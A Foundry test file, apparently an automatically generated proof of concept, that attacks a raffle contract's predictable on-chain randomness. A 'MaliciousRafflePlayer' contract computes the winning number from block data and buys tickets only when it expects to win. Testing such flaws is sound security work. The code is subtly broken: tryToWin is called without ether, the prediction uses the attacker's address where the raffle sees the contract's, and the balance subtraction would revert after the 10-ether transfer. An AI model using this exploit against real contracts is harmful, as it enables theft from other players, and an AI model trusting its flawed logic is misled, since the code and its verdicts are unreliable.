// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etheraffle.sol";

contract EthraffleTest is Test {
    Ethraffle_v4b public raffle;
    address owner = address(0x1);
    address attacker = address(0x2);
    uint256 constant TICKET_PRICE = 0.01 ether;
    uint256 constant TOTAL_TICKETS = 100;

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
        
        vm.prank(owner);
        raffle = new Ethraffle_v4b();
        
        // Set up initial parameters (assuming these are settable)
        vm.prank(owner);
        raffle.togglePause(); // Unpause the raffle
    }

    function testRandomnessManipulation() public {
        // --- BEFORE-Trigger: Record initial state ---
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Attacker ETH balance before attack:", attackerBalanceBefore);
        
        // --- Trigger: Execute entire attack ---
        console.log("--- Trigger Attack Steps ---");
        // Attacker deploys malicious contract
        vm.prank(attacker);
        MaliciousRafflePlayer maliciousPlayer = new MaliciousRafflePlayer(payable(address(raffle)));

        // Fund the malicious contract
        vm.prank(attacker);
        payable(address(maliciousPlayer)).transfer(10 ether);

        // Normal users buy tickets (simulating other participants)
        address[] memory users = new address[](5);
        for (uint i = 0; i < 5; i++) {
            users[i] = address(uint160(0x100 + i));
            vm.deal(users[i], 10 ether);
            vm.prank(users[i]);
            raffle.buyTickets{value: TICKET_PRICE * 10}();
        }

        // Attacker monitors and only plays when they can win
        vm.prank(attacker);
        maliciousPlayer.tryToWin();

        // Claim winnings
        vm.prank(attacker);
        maliciousPlayer.claimWinnings();

        // --- AFTER-Trigger: Record final state ---
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Attacker ETH balance after attack:", attackerBalanceAfter);
        
        // --- Comparison Verdict ---
        uint256 balanceDiff = attackerBalanceAfter - attackerBalanceBefore;
        bool vulnerabilityExists = attackerBalanceAfter > attackerBalanceBefore;
        console.log("Balance change: %d wei", balanceDiff);
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker gained %d wei", balanceDiff);
        } else {
            console.log("Vulnerability not Exist: No ETH gained by attacker");
        }

        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker ETH balance increased during attack");
        } else {
            console.log("Vulnerability not Exist: Attacker ETH balance did not increase");
        }
    }
}

contract MaliciousRafflePlayer {
    Ethraffle_v4b public raffle;
    address public owner;
    bool public won;

    constructor(address payable _raffle) {
        raffle = Ethraffle_v4b(_raffle);
        owner = msg.sender;
    }

    function tryToWin() external payable {
        // Calculate if current block parameters would make us win
        uint256 seed1 = uint256(uint160(address(block.coinbase))) % raffle.totalTickets();
        uint256 seed2 = uint256(uint160(msg.sender)) % raffle.totalTickets();
        uint256 seed3 = block.prevrandao;
        bytes32 randHash = keccak256(abi.encodePacked(seed1, seed2, seed3));
        uint256 winningNumber = uint256(randHash) % raffle.totalTickets();

        // If we can predict we'll win based on current block params, buy tickets
        if (winningNumber < 10) { // Assuming attacker buys first 10 tickets
            raffle.buyTickets{value: msg.value}();
            won = true;
        }
    }

    function claimWinnings() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}